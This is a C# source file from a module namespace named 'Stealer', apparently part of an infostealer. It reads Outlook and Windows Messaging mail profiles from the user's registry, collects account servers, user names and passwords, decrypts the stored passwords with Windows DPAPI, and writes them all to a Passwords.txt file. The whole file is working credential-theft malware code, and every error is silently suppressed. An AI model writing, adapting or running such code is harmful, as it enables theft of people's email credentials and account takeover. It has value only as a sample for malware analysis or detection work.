using Microsoft.Win32;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace Stealer.modules
{
  internal class MailClient
  {
    public static void GoMailClient()
    {
      MailClient.GrabOutlook();
    }

    private static void GrabOutlook()
    {
      string str1 = Program.path + "\\";
      string str2 = "";
      string str3 = "\\Mail\\Outlook";
      string[] strArray = new string[4]
      {
        "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
        "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
      };
      string[] clients = new string[28]
      {
        "SMTP Email Address",
        "SMTP Server",
        "POP3 Server",
        "POP3 User Name",
        "SMTP User Name",
        "NNTP Email Address",
        "NNTP User Name",
        "NNTP Server",
        "IMAP Server",
        "IMAP User Name",
        "Email",
        "HTTP User",
        "HTTP Server URL",
        "POP3 User",
        "IMAP User",
        "HTTPMail User Name",
        "HTTPMail Server",
        "SMTP User",
        "POP3 Password2",
        "IMAP Password2",
        "NNTP Password2",
        "HTTPMail Password2",
        "SMTP Password2",
        "POP3 Password",
        "IMAP Password",
        "NNTP Password",
        "HTTPMail Password",
        "SMTP Password"
      };
      foreach (string path in strArray)
        str2 += MailClient.Get(path, clients);
      try
      {
        Directory.CreateDirectory(str1 + str3);
        File.WriteAllText(str1 + str3 + "\\Passwords.txt", str2 + "\r\n");
      }
      catch
      {
      }
    }

    private static string Get(string path, string[] clients)
    {
      Regex regex1 = new Regex("^(?!:\\/\\/)([a-zA-Z0-9-_]+\\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\\.[a-zA-Z]{2,11}?$");
      Regex regex2 = new Regex("^([a-zA-Z0-9_\\-\\.]+)@([a-zA-Z0-9_\\-\\.]+)\\.([a-zA-Z]{2,5})$");
      string str = "";
      try
      {
        foreach (string client in clients)
        {
          try
          {
            object infoFromReg = MailClient.GetInfoFromReg(path, client);
            if (infoFromReg != null && client.Contains("Password") && !client.Contains("2"))
              str = str + client + ": " + MailClient.Decrypt((byte[]) infoFromReg) + "\r\n";
            else if (regex1.IsMatch(infoFromReg.ToString()) || regex2.IsMatch(infoFromReg.ToString()))
              str = str + client + ": " + infoFromReg.ToString() + "\r\n";
            else
              str = str + client + ": " + Encoding.UTF8.GetString((byte[]) infoFromReg).Replace(Convert.ToChar(0).ToString(), "") + "\r\n";
          }
          catch
          {
          }
        }
        foreach (string subKeyName in Registry.CurrentUser.OpenSubKey(path, false).GetSubKeyNames())
          str += MailClient.Get(path + "\\" + subKeyName, clients);
      }
      catch
      {
      }
      return str;
    }

    private static object GetInfoFromReg(string path, string valueName)
    {
      object obj = (object) null;
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
        obj = registryKey.GetValue(valueName);
        registryKey.Close();
      }
      catch
      {
      }
      return obj;
    }

    private static string Decrypt(byte[] encrypted)
    {
      try
      {
        byte[] encryptedData = new byte[encrypted.Length - 1];
        Buffer.BlockCopy((Array) encrypted, 1, (Array) encryptedData, 0, encrypted.Length - 1);
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, (byte[]) null, DataProtectionScope.CurrentUser)).Replace(Convert.ToChar(0).ToString(), "");
      }
      catch
      {
      }
      return "null";
    }
  }
}
